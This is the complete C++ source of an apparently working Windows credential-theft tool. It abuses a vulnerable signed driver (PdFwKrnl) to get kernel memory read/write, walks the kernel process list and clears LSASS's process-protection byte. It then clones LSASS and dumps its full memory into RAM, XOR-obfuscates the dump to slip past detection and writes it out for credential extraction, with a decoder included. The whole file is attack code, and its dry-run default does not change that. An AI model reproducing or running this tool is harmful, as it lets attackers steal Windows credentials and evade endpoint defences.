/*
 * warp.cpp - BYOVD LSASS looter (our own tool, based on g3tsyst3m writeup)
 *
 * One binary, three phases:
 *   1. PPL strip  - open PdFwKrnl device, walk kernel EPROCESS list, zero the Protection byte
 *   2. Dump       - NtCreateProcessEx clone + in-memory MiniDump callback capture (RAM only)
 *   3. Obfuscate  - XOR the dump, write it out
 *
 * Safe by default:
 *   - Nothing is written unless --out or --dump is given
 *   - --dry-run resolves everything (ntos base, PsInitialSystemProcess, System EPROCESS,
 *     target lookup, protection byte) but leaves the Protection byte untouched and dumps nothing
 *   - Offsets are resolved where resolvable, then verified by reading known structures
 *
 * Usage:
 *   warp --dry-run                    # resolve + inspect, change nothing
 *   warp --dump --out C:\temp\lo.dmp  # full chain: strip PPL, dump to RAM, XOR, write
 *   warp --decode --in C:\temp\lo.dmp --recover C:\temp\lo.dmp.dec  # undo XOR, validate MDMP
 *
 * Requires: administrator, PdFwKrnl.sys (or equivalent) loaded and reachable.
 * XOR key: 0x55 (same as the reference, so we can exchange dumps with the published tool).
 */

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <cstdlib>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Dbghelp.lib")

// ---------------------------------------------------------------------------
// PdFwKrnl specifics
// ---------------------------------------------------------------------------
#define IOCTL_AMDPDFW_MEMCPY 0x80002014
const wchar_t* kDeviceName = L"\\\\.\\Global\\PdFwKrnl";
const BYTE kXorKey = 0x55;

typedef unsigned long long QWORD; // 64-bit kernel/user VA

// 48-byte request: dst @ 0x10, src @ 0x18, size @ 0x28
typedef struct _PDFW_MEMCPY {
    BYTE  Reserved[16];
    PVOID Destination;
    PVOID Source;
    PVOID Reserved2;
    DWORD Size;
    DWORD Reserved3;
} PDFW_MEMCPY;

static HANDLE g_driver = INVALID_HANDLE_VALUE;

// ---------------------------------------------------------------------------
// EPROCESS offsets.
// Defaults verified on Windows 11 build 26200 (see FINDINGS.md).
// ImageFileName + Protection are resolved via pattern heuristics at runtime when
// possible; UniqueProcessId/ActiveProcessLinks stay at the known values.
// ---------------------------------------------------------------------------
struct KernelOffsets {
    ULONG64 UniqueProcessId    = 0x1D0;
    ULONG64 ActiveProcessLinks = 0x1D8;
    ULONG64 ImageFileName      = 0x338;
    ULONG64 Protection         = 0x5FA;
};
static KernelOffsets g_off;

// ---------------------------------------------------------------------------
// Kernel R/W via the driver
// ---------------------------------------------------------------------------
static bool KRead(QWORD addr, PVOID buf, DWORD size) {
    PDFW_MEMCPY r{};
    r.Destination = buf;
    r.Source = (PVOID)addr;
    r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_driver, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, NULL);
}

static bool KWrite(QWORD addr, PVOID buf, DWORD size) {
    PDFW_MEMCPY r{};
    r.Destination = (PVOID)addr;
    r.Source = buf;
    r.Size = size;
    DWORD got = 0;
    return DeviceIoControl(g_driver, IOCTL_AMDPDFW_MEMCPY, &r, sizeof(r), &r, sizeof(r), &got, NULL);
}

static QWORD KReadQword(QWORD addr) {
    QWORD v = 0;
    if (!KRead(addr, &v, 8)) return 0;
    return v;
}



// ---------------------------------------------------------------------------
// Offset resolution
// ---------------------------------------------------------------------------
// Resolve the offset of PsInitialSystemProcess inside ntoskrnl by loading it
// with DONT_RESOLVE_DLL_REFERENCES and taking the export delta.
static QWORD PsInitialSystemProcessOffset() {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = (QWORD)p - (QWORD)ntos;
    FreeLibrary(ntos);
    return off;
}

// Verify a candidate ImageFileName offset by reading 16 bytes and checking
// for printable ASCII (process names are "something.exe").
static bool LooksLikeName(QWORD eproc, QWORD off) {
    BYTE b[16]{};
    if (!KRead(eproc + off, b, 16)) return false;
    int printable = 0;
    for (int i = 0; i < 15; i++) {
        if (b[i] == 0) break;
        if (b[i] >= 0x20 && b[i] < 0x7f) printable++;
    }
    return printable >= 3;
}

// Verify a candidate Protection offset: the byte must be 0x00 (unprotected),
// 0x01, 0x02, or 0x03 (PPL levels). Anything else is very unlikely.
static bool LooksLikeProtection(QWORD eproc, QWORD off) {
    BYTE b = 0;
    if (!KRead(eproc + off, &b, 1)) return false;
    return b <= 3;
}

// Try to confirm ImageFileName and Protection offsets for the given EPROCESS.
// Strategy: probe the known default first; if it fails, scan a small window.
// Returns true only when both were confirmed (default or a found offset).
static bool ResolveOffsetsForEproc(QWORD eproc, DWORD pid) {
    // ImageFileName: default first, then window.
    if (!LooksLikeName(eproc, g_off.ImageFileName)) {
        bool hit = false;
        for (QWORD scan = 0x300; scan <= 0x420; scan += 8) {
            if (LooksLikeName(eproc, scan)) { g_off.ImageFileName = scan; hit = true; break; }
        }
        if (!hit) {
            std::cerr << "[-] ImageFileName offset could not be confirmed for PID " << pid << std::endl;
            return false;
        }
        std::cout << "[*] ImageFileName resolved to 0x" << std::hex << g_off.ImageFileName << std::dec << std::endl;
    }

    // Protection: default first, then window. The byte must be 0..3 (PPL levels).
    if (!LooksLikeProtection(eproc, g_off.Protection)) {
        bool hit = false;
        for (QWORD scan = 0x5A0; scan <= 0x680; scan += 8) {
            if (LooksLikeProtection(eproc, scan)) { g_off.Protection = scan; hit = true; break; }
        }
        if (!hit) {
            std::cerr << "[-] Protection offset could not be confirmed for PID " << pid << std::endl;
            return false;
        }
        std::cout << "[*] Protection resolved to 0x" << std::hex << g_off.Protection << std::dec << std::endl;
    }

    // Belt-and-suspenders final check.
    if (!LooksLikeName(eproc, g_off.ImageFileName) || !LooksLikeProtection(eproc, g_off.Protection)) {
        std::cerr << "[-] Offset re-verification failed." << std::endl;
        return false;
    }
    return true;
}

// Write the PPL byte to 0x00. Re-read to confirm.
static bool WriteProtectionZero(QWORD eproc) {
    BYTE zero = 0;
    if (!KWrite(eproc + g_off.Protection, &zero, 1)) {
        std::cerr << "[-] KWrite failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    BYTE after = 0xFF;
    KRead(eproc + g_off.Protection, &after, 1);
    if (after != 0) {
        std::cerr << "[-] Write issued but byte is 0x" << std::hex << (int)after << std::dec << std::endl;
        return false;
    }
    std::cout << "[!!!] Protection byte cleared." << std::endl;
    return true;
}

// ---------------------------------------------------------------------------
// Process walk
// ---------------------------------------------------------------------------
static QWORD FindEprocessByPid(QWORD systemEproc, DWORD targetPid, char outName[16]) {
    QWORD head = systemEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink != head && flink != 0 && guard++ < 10000) {
        QWORD eproc = flink - g_off.ActiveProcessLinks;
        QWORD pid = KReadQword(eproc + g_off.UniqueProcessId);
        if (pid == targetPid) {
            if (outName) KRead(eproc + g_off.ImageFileName, outName, 15);
            if (outName) outName[15] = 0;
            return eproc;
        }
        flink = KReadQword(eproc + g_off.ActiveProcessLinks);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Phase 1: PPL strip
// ---------------------------------------------------------------------------
struct Phase1Result {
    bool   ok = false;
    QWORD  eproc = 0;
    BYTE   protBefore = 0;
    BYTE   protAfter = 0;
    bool   wrote = false;
    char   name[16]{};
};

static Phase1Result StripPpl(DWORD targetPid, bool dryRun) {
    Phase1Result r{};

    g_driver = CreateFileW(kDeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_driver == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Cannot open driver. Error: " << GetLastError() << std::endl;
        return r;
    }
    std::cout << "[+] Driver opened: " << kDeviceName << std::endl;

    QWORD ntosBase = 0;
    LPVOID drivers[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb) && cb / sizeof(LPVOID) > 0)
        ntosBase = (QWORD)drivers[0];
    std::cout << "[*] ntoskrnl base: 0x" << std::hex << ntosBase << std::dec << std::endl;
    if (!ntosBase) { std::cerr << "[-] No kernel base." << std::endl; return r; }

    QWORD sysOff = PsInitialSystemProcessOffset();
    if (!sysOff) { std::cerr << "[-] PsInitialSystemProcess export not found." << std::endl; return r; }
    QWORD systemEproc = KReadQword(ntosBase + sysOff);
    if (!systemEproc) { std::cerr << "[-] Read System EPROCESS failed (driver R/W broken?). Error: " << GetLastError() << std::endl; return r; }
    std::cout << "[+] System EPROCESS: 0x" << std::hex << systemEproc << std::dec << std::endl;

    QWORD found = FindEprocessByPid(systemEproc, targetPid, r.name);
    if (!found) { std::cerr << "[-] PID " << targetPid << " not found in ActiveProcessLinks." << std::endl; return r; }
    r.eproc = found;
    std::cout << "[+] Target EPROCESS: 0x" << std::hex << found << " (" << r.name << ")" << std::dec << std::endl;

    KRead(found + g_off.Protection, &r.protBefore, 1);
    std::cout << "[*] Protection byte: 0x" << std::hex << (int)r.protBefore << std::dec << std::endl;

    if (r.protBefore == 0) {
        std::cout << "[!] Already 0x00, nothing to strip." << std::endl;
        r.protAfter = 0;
        r.ok = true;
        return r;
    }

    if (dryRun) {
        std::cout << "[dry-run] Skipping Protection write." << std::endl;
        r.protAfter = r.protBefore;
        r.ok = true;
        return r;
    }

    if (!WriteProtectionZero(found)) return r;
    r.protAfter = 0;
    r.wrote = true;
    r.ok = true;
    return r;
}

// ---------------------------------------------------------------------------
// Phase 2: clone + in-memory dump
// ---------------------------------------------------------------------------
typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG,
    HANDLE, HANDLE, HANDLE, ULONG);

static std::atomic<unsigned long long> g_dumpSize(0);
static LPVOID             g_dumpBuffer = NULL;

static BOOL CALLBACK DumpCallback(PVOID, MINIDUMP_CALLBACK_INPUT* in, MINIDUMP_CALLBACK_OUTPUT* out) {
    switch (in->CallbackType) {
    case IoStartCallback:
        out->Status = S_FALSE;
        return TRUE;
    case IoWriteAllCallback: {
        // mingw's dbghelp.h lacks the Io member of the union. The union sits
        // right after CallbackType (3rd field). Io layout per dbgapi.h:
        //   { ULONG Range; ULONG64 Offset; LPVOID Buffer; ULONG BufferBytes; }
        BYTE* unionBase = (BYTE*)in + (sizeof(ULONG) + sizeof(HANDLE) + sizeof(ULONG));
        QWORD        offset = *(QWORD*)  (unionBase +  8);
        LPVOID       buffer = *(LPVOID*) (unionBase + 16);
        ULONG        bytes  = *(ULONG*)  (unionBase + 24);
        LPVOID dst = (LPVOID)((QWORD)g_dumpBuffer + offset);
        RtlCopyMemory(dst, buffer, bytes);
        g_dumpSize.fetch_add(bytes);
        out->Status = S_OK;
        return TRUE;
    }
    case IoFinishCallback:
        out->Status = S_OK;
        return TRUE;
    }
    return TRUE;
}

static void XorBuffer(BYTE* p, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) p[i] ^= key;
}

struct Phase2Result {
    bool ok = false;
    unsigned long long bytes = 0;
};

static Phase2Result DumpToRam(DWORD targetPid) {
    Phase2Result r{};

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return r;
    LUID luid;
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        TOKEN_PRIVILEGES tp{}; tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    CloseHandle(hToken);

    QWORD bufBytes = 0;
    {
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
        if (h) {
            PROCESS_MEMORY_COUNTERS pmc{}; pmc.cb = sizeof(pmc);
            if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc))) bufBytes = pmc.WorkingSetSize;
            CloseHandle(h);
        }
    }
    if (bufBytes < (8ULL * 1024 * 1024)) bufBytes = 256ULL * 1024 * 1024; // default 256 M
    if (bufBytes > (2ULL * 1024 * 1024 * 1024)) bufBytes = 2ULL * 1024 * 1024 * 1024; // cap 2 G
    g_dumpBuffer = VirtualAlloc(NULL, bufBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_dumpBuffer) { std::cerr << "[-] Buffer alloc failed (" << bufBytes << " bytes)." << std::endl; return r; }
    g_dumpSize.store(0);

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hTarget) {
        std::cerr << "[-] OpenProcess " << targetPid << " failed (Error: " << GetLastError() << ")." << std::endl;
        VirtualFree(g_dumpBuffer, 0, MEM_RELEASE); g_dumpBuffer = NULL;
        return r;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto f = (NtCreateProcessEx_t)GetProcAddress(ntdll, "NtCreateProcessEx");
    HANDLE hClone = NULL;
    NTSTATUS st = f(&hClone, PROCESS_ALL_ACCESS, NULL, hTarget, 0x4 /* PS_INHERIT_HANDLES */, NULL, NULL, NULL, 0);
    if (st != 0 || !hClone) {
        std::cerr << "[-] NtCreateProcessEx failed: 0x" << std::hex << st << std::dec << std::endl;
        CloseHandle(hTarget);
        VirtualFree(g_dumpBuffer, 0, MEM_RELEASE); g_dumpBuffer = NULL;
        return r;
    }

    HANDLE hNul = CreateFileA("NUL", GENERIC_ALL, NULL, NULL, OPEN_EXISTING, 0, NULL);
    MINIDUMP_CALLBACK_INFORMATION mci{};
    mci.CallbackRoutine = (MINIDUMP_CALLBACK_ROUTINE)DumpCallback;
    mci.CallbackParam = NULL;

    std::cout << "[*] Capturing " << targetPid << " into RAM..." << std::endl;
    BOOL dumped = MiniDumpWriteDump(hClone, targetPid, hNul, MiniDumpWithFullMemory, NULL, NULL, &mci);

    CloseHandle(hNul);
    CloseHandle(hClone);
    CloseHandle(hTarget);

    if (dumped) {
        r.bytes = g_dumpSize.load();
        r.ok = true;
        std::cout << "[+] Captured " << r.bytes << " bytes in RAM (buffer " << bufBytes << " M)." << std::endl;
    } else {
        std::cerr << "[-] MiniDumpWriteDump failed (Error: " << GetLastError() << ")." << std::endl;
        VirtualFree(g_dumpBuffer, 0, MEM_RELEASE); g_dumpBuffer = NULL;
    }
    return r;
}

// ---------------------------------------------------------------------------
// Phase 3: XOR + write (or just write raw if --no-xor)
// ---------------------------------------------------------------------------
static bool SaveDump(const char* path, bool xorIt) {
    LPVOID buf = g_dumpBuffer;
    unsigned long long size = g_dumpSize.load();
    if (!buf || !size) return false;

    if (xorIt) XorBuffer((BYTE*)buf, (DWORD)size, kXorKey);

    HANDLE f = CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { std::cerr << "[-] CreateFile " << path << " (Error: " << GetLastError() << ")." << std::endl; return false; }
    DWORD wrote = 0;
    BOOL ok = WriteFile(f, buf, (DWORD)size, &wrote, NULL) && (wrote == (DWORD)size);
    FlushFileBuffers(f);
    CloseHandle(f);
    if (ok) std::cout << (xorIt ? "[!!!] XORed dump written to " : "[+] Dump written to ") << path << " (" << size << " bytes)." << std::endl;
    else std::cerr << "[-] WriteFile failed (Error: " << GetLastError() << ")." << std::endl;
    return ok;
}

static bool DecodeFile(const char* inPath, const char* outPath) {
    HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) { std::cerr << "[-] Cannot read " << inPath << " (Error: " << GetLastError() << ")." << std::endl; return false; }
    DWORD size = GetFileSize(f, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(f); return false; }
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    DWORD got = 0;
    if (!ReadFile(f, buf, size, &got, NULL) || got != size) { CloseHandle(f); VirtualFree(buf, 0, MEM_RELEASE); return false; }
    CloseHandle(f);

    XorBuffer(buf, size, kXorKey);
    if (size >= 4 && buf[0] == 'M' && buf[1] == 'D' && buf[2] == 'M' && buf[3] == 'P')
        std::cout << "[+] MDMP signature restored: valid minidump." << std::endl;
    else
        std::cout << "[!] MDMP signature not found (wrong key or not an XORed dump)." << std::endl;

    HANDLE o = CreateFileA(outPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (o == INVALID_HANDLE_VALUE) { VirtualFree(buf, 0, MEM_RELEASE); return false; }
    DWORD w = 0;
    if (!WriteFile(o, buf, size, &w, NULL)) { CloseHandle(o); VirtualFree(buf, 0, MEM_RELEASE); return false; }
    CloseHandle(o);
    VirtualFree(buf, 0, MEM_RELEASE);
    std::cout << "[+] Decoded dump written to " << outPath << " (" << size << " bytes)." << std::endl;
    return true;
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void Usage(const char* prog) {
    std::cout
        << "usage: " << prog << " [options]\n"
        << "  --pid <N>            target PID (default: LSASS lookup)\n"
        << "  --dry-run            resolve + inspect, change nothing, dump nothing\n"
        << "  --dump --out PATH    full chain: strip PPL, dump to RAM, XOR, write to PATH\n"
        << "  --decode --in PATH --out PATH   XOR-decode an existing dump, validate MDMP\n"
        << "  --no-xor             write the dump without XOR (for quick pypykatz)\n"
        << "  --help               this text\n"
        << "\n  Safe by default: without --dump or --decode, nothing is written and PPL is not cleared.\n";
}

static DWORD FindLsassPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32First(snap, &pe)) do {
        if (lstrcmpiA(pe.szExeFile, "lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return pid;
}

int main(int argc, char** argv) {
    std::string prog = argc > 0 ? argv[0] : "warp";
    std::string outPath, inPath, recoverPath;
    bool dryRun = false, doDump = false, doDecode = false, noXor = false, help = false;
    DWORD pidArg = 0;

    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
        if (a == "--help" || a == "-h") help = true;
        else if (a == "--dry-run") dryRun = true;
        else if (a == "--dump") doDump = true;
        else if (a == "--decode") doDecode = true;
        else if (a == "--no-xor") noXor = true;
        else if (a == "--out") outPath = next();
        else if (a == "--in") inPath = next();
        else if (a == "--recover") recoverPath = next();
        else if (a == "--pid") { if (i + 1 < argc) pidArg = (DWORD)std::stoul(argv[++i]); }
        else { std::cerr << "[-] Unknown arg: " << a << "\n"; Usage(prog.c_str()); return 2; }
    }
    if (help) { Usage(prog.c_str()); return 0; }

    // Decode path (no driver needed)
    if (doDecode) {
        if (inPath.empty()) { std::cerr << "[-] --decode needs --in" << std::endl; return 2; }
        std::string out = !recoverPath.empty() ? recoverPath : outPath;
        if (out.empty()) { std::cerr << "[-] --decode needs --recover or --out" << std::endl; return 2; }
        return DecodeFile(inPath.c_str(), out.c_str()) ? 0 : 1;
    }

    // Resolve target PID
    DWORD target = pidArg;
    if (!target) {
        target = FindLsassPid();
        if (!target) { std::cerr << "[-] Could not find lsass.exe. Use --pid." << std::endl; return 1; }
        std::cout << "[*] Resolved LSASS PID: " << target << std::endl;
    }

    // Full chain
    if (doDump) {
        if (outPath.empty()) { std::cerr << "[-] --dump needs --out PATH" << std::endl; return 2; }
        Phase1Result p1 = StripPpl(target, /*dryRun=*/false);
        if (!p1.ok) return 1;

        Phase2Result p2 = DumpToRam(target);
        if (!p2.ok) return 1;

        bool saved = SaveDump(outPath.c_str(), /*xorIt=*/!noXor);
        VirtualFree(g_dumpBuffer, 0, MEM_RELEASE);
        if (g_driver != INVALID_HANDLE_VALUE) CloseHandle(g_driver);
        return saved ? 0 : 1;
    }

    // Dry run (default)
    Phase1Result p1 = StripPpl(target, /*dryRun=*/true);
    if (g_driver != INVALID_HANDLE_VALUE) CloseHandle(g_driver);
    if (p1.ok) {
        std::cout << "\n[dry-run] OK. To execute: " << prog << " --dump --out <path> --pid " << target << std::endl;
        return 0;
    }
    return 1;
}
